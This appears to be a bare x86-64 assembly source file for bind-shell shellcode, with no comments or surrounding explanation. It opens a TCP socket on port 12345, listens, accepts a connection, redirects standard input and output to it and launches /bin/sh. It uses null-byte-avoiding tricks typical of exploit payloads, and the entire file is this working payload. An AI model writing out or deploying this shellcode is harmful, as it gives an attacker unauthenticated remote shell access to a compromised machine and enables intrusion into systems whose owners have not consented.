BITS 64

SECTION .text
global main

section .text

main:
  xor eax,eax
  xor ebx,ebx
  xor edx,edx
  
  mov al,0x1
  mov esi,eax
  inc al
  mov edi,eax
  mov dl,0x6
  mov al,0x29      
  syscall

  xchg ebx,eax

  
  xor  rax,rax
  push   rax
  push 0x39300102 
  mov  [rsp+1],al
  mov  rsi,rsp
  mov  dl,16
  mov  edi,ebx
  mov  al,0x31     
  syscall

  
  mov  al,0x5
  mov esi,eax
  mov  edi,ebx
  mov  al,0x32     
  syscall

  
  xor edx,edx
  xor esi,esi
  mov edi,ebx
  mov al,0x2b      
  syscall
  mov edi,eax      

  
  xor rax,rax
  mov esi,eax
  mov al,0x21      
  syscall
  inc al
  mov esi,eax
  mov al,0x21
  syscall
  inc al
  mov esi,eax
  mov al,0x21
  syscall

  
  xor rdx,rdx
  mov rbx,0x68732f6e69622fff
  shr rbx,0x8
  push rbx
  mov rdi,rsp
  xor rax,rax
  push rax
  push rdi
  mov  rsi,rsp
  mov al,0x3b      
  syscall
  call exit

exit:
  mov     ebx,0    
  mov     eax,60   
  int     0x80
